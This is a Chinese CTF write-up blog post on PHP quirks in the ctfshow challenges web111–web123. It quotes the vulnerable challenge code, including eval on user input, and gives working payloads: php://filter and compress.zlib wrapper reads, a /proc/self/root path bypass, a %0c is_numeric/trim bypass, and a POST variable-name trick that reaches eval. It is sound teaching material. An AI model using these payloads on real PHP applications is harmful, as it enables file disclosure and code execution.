@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="web1111234567891011121314151617181920212223242526272829highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);function getFlag(&amp;$v1,&amp;$v2)&amp;#123;    eval(&quot;$$v1 &#x3D; &amp;$$v">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php特性篇(web111-web131)">
+<meta property="og:url" content="http://example.com/2022/01/30/php%E7%89%B9%E6%80%A7%E7%AF%87-web111-web131/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="web1111234567891011121314151617181920212223242526272829highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);function getFlag(&amp;$v1,&amp;$v2)&amp;#123;    eval(&quot;$$v1 &#x3D; &amp;$$v">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-01-30T08:49:50.000Z">
+<meta property="article:modified_time" content="2024-02-03T04:12:02.442Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>php特性篇(web111-web131)</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/02/18/%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/01/02/php%E5%86%85%E7%BD%AE%E7%B1%BB-web109-web110/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/01/30/php%E7%89%B9%E6%80%A7%E7%AF%87-web111-web131/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/01/30/php%E7%89%B9%E6%80%A7%E7%AF%87-web111-web131/&text=php特性篇(web111-web131)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/01/30/php%E7%89%B9%E6%80%A7%E7%AF%87-web111-web131/&title=php特性篇(web111-web131)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/01/30/php%E7%89%B9%E6%80%A7%E7%AF%87-web111-web131/&is_video=false&description=php特性篇(web111-web131)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=php特性篇(web111-web131)&body=Check out this article: http://example.com/2022/01/30/php%E7%89%B9%E6%80%A7%E7%AF%87-web111-web131/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/01/30/php%E7%89%B9%E6%80%A7%E7%AF%87-web111-web131/&title=php特性篇(web111-web131)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/01/30/php%E7%89%B9%E6%80%A7%E7%AF%87-web111-web131/&title=php特性篇(web111-web131)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/01/30/php%E7%89%B9%E6%80%A7%E7%AF%87-web111-web131/&title=php特性篇(web111-web131)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/01/30/php%E7%89%B9%E6%80%A7%E7%AF%87-web111-web131/&title=php特性篇(web111-web131)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/01/30/php%E7%89%B9%E6%80%A7%E7%AF%87-web111-web131/&name=php特性篇(web111-web131)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/01/30/php%E7%89%B9%E6%80%A7%E7%AF%87-web111-web131/&t=php特性篇(web111-web131)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web111"><span class="toc-number">1.</span> <span class="toc-text">web111</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web112"><span class="toc-number">2.</span> <span class="toc-text">web112</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web113"><span class="toc-number">3.</span> <span class="toc-text">web113</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web114"><span class="toc-number">4.</span> <span class="toc-text">web114</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web115"><span class="toc-number">5.</span> <span class="toc-text">web115</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web123"><span class="toc-number">6.</span> <span class="toc-text">web123</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        php特性篇(web111-web131)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-01-30T08:49:50.000Z" class="dt-published" itemprop="datePublished">2022-01-30</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h3 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">function getFlag(&amp;$v1,&amp;$v2)&#123;</span><br><span class="line">    eval(&quot;$$v1 = &amp;$$v2;&quot;);</span><br><span class="line">    var_dump($$v1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;, $v1))&#123;</span><br><span class="line">            die(&quot;error v1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;, $v2))&#123;</span><br><span class="line">            die(&quot;error v2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123;</span><br><span class="line">            getFlag($v1,$v2);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>getFlag()方法里面的eval操作没看懂，之后再说。</p>
+<h3 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($file)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&quot;hacker!&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>考察点：php伪协议绕过is_file()、highlight_file()对于php伪协议的使用</p>
+<p>函数介绍：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is_file(string $filename):bool   //判断给定文件名是否为一个正常的文件</span><br></pre></td></tr></table></figure>
+
+<p>我们的目的是不能让is_file()检测出是文件，并且 highlight_file()可以识别为文件。这时候可以利用php伪协议。<br>可以直接用不带任何过滤器的filter伪协议<br>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php<br>也可以用一些没有过滤掉的编码方式和转换方式<br>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.php<br>?file&#x3D;compress.zlib:&#x2F;&#x2F;flag.php<br>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.iconv.utf-8.utf-16le&#x2F;resource&#x3D;flag.php</p>
+<p>更多php支持的协议和封装协议：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p>
+<h3 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($file)&#123;</span><br><span class="line">    if(preg_match(&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&#x27;hacker!&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了”filter”</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=compress.zlib://flag.php</span><br></pre></td></tr></table></figure>
+
+<p>另一种解法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/ self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se lf/root/proc/self/root/var/www/html/flag.php</span><br><span class="line"></span><br><span class="line">目录溢出，在is_file()那里不会认为这是一个文件，但是是可以正常打开的</span><br></pre></td></tr></table></figure>
+
+<p>我尝试过传入?file&#x3D;file:&#x2F;&#x2F;&#x2F;flag.php，并没有被过滤的字符串，结果网页回显”hacker!”，后来发现这个”hacker!”不是filter()方法里的，而是倒数第二行代码输出的”hacker!”，是因为is_filter()函数那里没有通过。</p>
+<h3 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h3><p>留了个filter就不多说了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($num)&#123;</span><br><span class="line">    $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);</span><br><span class="line">    return $num;</span><br><span class="line">&#125;</span><br><span class="line">$num=$_GET[&#x27;num&#x27;];</span><br><span class="line">if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;</span><br><span class="line">    if($num==&#x27;36&#x27;)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;hacker!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!!!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>知识点</strong></p>
+<p>　　1、is_numeric() 只允许数字或数字字符串（八进制、十六进制、科学计数法），且<strong>允许数字或数字字符串前有空格（包括普通空格、制表符、换行符等）</strong></p>
+<p>　　2、trim() 去除普通空格、制表符(%09)、换行符(%0a)、回车符(%0d)、空字节符(%00)、垂直制表符（%0b），<strong>但不去除换页符（%0c）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">语法</span><br><span class="line">trim(string,charlist)</span><br><span class="line"></span><br><span class="line">参数	描述</span><br><span class="line">string	        必需。规定要检查的字符串。</span><br><span class="line">charlist	    可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：</span><br><span class="line"></span><br><span class="line">&quot;\0&quot;       - NULL</span><br><span class="line">&quot;\t&quot;       - 制表符</span><br><span class="line">&quot;\n&quot;       - 换行</span><br><span class="line">&quot;\x0B&quot;     - 垂直制表符</span><br><span class="line">&quot;\r&quot;       - 回车</span><br><span class="line">&quot; &quot;        - 空格</span><br></pre></td></tr></table></figure>
+
+<p>　　3、弱类型比较和强类型比较的区别：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/IFS-/p/17290199.html">https://www.cnblogs.com/IFS-/p/17290199.html</a></p>
+<p>跑个php脚本看有哪些字符可以同时绕过trim()和is_numeric()：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i = 0; $i &lt;= 128; $i++) &#123;</span><br><span class="line">    $a = chr($i) . &#x27;36&#x27;;</span><br><span class="line">    if (trim($a) !== &#x27;36&#x27; &amp;&amp; is_numeric($a)) &#123;</span><br><span class="line">        echo urlencode(chr($i)) . &quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">脚本运行结果：</span><br><span class="line">%0C（换页符）</span><br><span class="line">%2B（加号）</span><br><span class="line">-</span><br><span class="line">.</span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td></tr></table></figure>
+
+<p>加上filter()的限制，只能选%0c</p>
+<p>payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=%<span class="number">0</span>c36</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class="line">$c=$_POST[&#x27;fun&#x27;];</span><br><span class="line">if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;</span><br><span class="line">    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;, $c)&amp;&amp;$c&lt;=18)&#123;</span><br><span class="line">         eval(&quot;$c&quot;.&quot;;&quot;);  </span><br><span class="line">         if($fl0g===&quot;flag_give_me&quot;)&#123;</span><br><span class="line">             echo $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一个难点是构造CTF_SHOW.COM变量，在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有空格、+、[则会被转化为_，所以按理来说我们构造不出CTF_SHOW.COM这个变量(因为含有.)，但php中有个特性就是如果传入[，它被转化为_之后，后面的字符就会被保留下来不会被替换</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post: CTF_SHOW=1&amp;&amp;CTF[SHOW.COM&amp;&amp;fun=echo $flag</span><br></pre></td></tr></table></figure>
+
+<p>源码里的$c&lt;&#x3D;18没看懂是什么意思，payload中$c&#x3D;”echo $flag”是满足这个条件的。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web111"><span class="toc-number">1.</span> <span class="toc-text">web111</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web112"><span class="toc-number">2.</span> <span class="toc-text">web112</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web113"><span class="toc-number">3.</span> <span class="toc-text">web113</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web114"><span class="toc-number">4.</span> <span class="toc-text">web114</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web115"><span class="toc-number">5.</span> <span class="toc-text">web115</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web123"><span class="toc-number">6.</span> <span class="toc-text">web123</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/01/30/php%E7%89%B9%E6%80%A7%E7%AF%87-web111-web131/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/01/30/php%E7%89%B9%E6%80%A7%E7%AF%87-web111-web131/&text=php特性篇(web111-web131)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/01/30/php%E7%89%B9%E6%80%A7%E7%AF%87-web111-web131/&title=php特性篇(web111-web131)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/01/30/php%E7%89%B9%E6%80%A7%E7%AF%87-web111-web131/&is_video=false&description=php特性篇(web111-web131)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=php特性篇(web111-web131)&body=Check out this article: http://example.com/2022/01/30/php%E7%89%B9%E6%80%A7%E7%AF%87-web111-web131/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/01/30/php%E7%89%B9%E6%80%A7%E7%AF%87-web111-web131/&title=php特性篇(web111-web131)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/01/30/php%E7%89%B9%E6%80%A7%E7%AF%87-web111-web131/&title=php特性篇(web111-web131)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/01/30/php%E7%89%B9%E6%80%A7%E7%AF%87-web111-web131/&title=php特性篇(web111-web131)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/01/30/php%E7%89%B9%E6%80%A7%E7%AF%87-web111-web131/&title=php特性篇(web111-web131)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/01/30/php%E7%89%B9%E6%80%A7%E7%AF%87-web111-web131/&name=php特性篇(web111-web131)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/01/30/php%E7%89%B9%E6%80%A7%E7%AF%87-web111-web131/&t=php特性篇(web111-web131)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
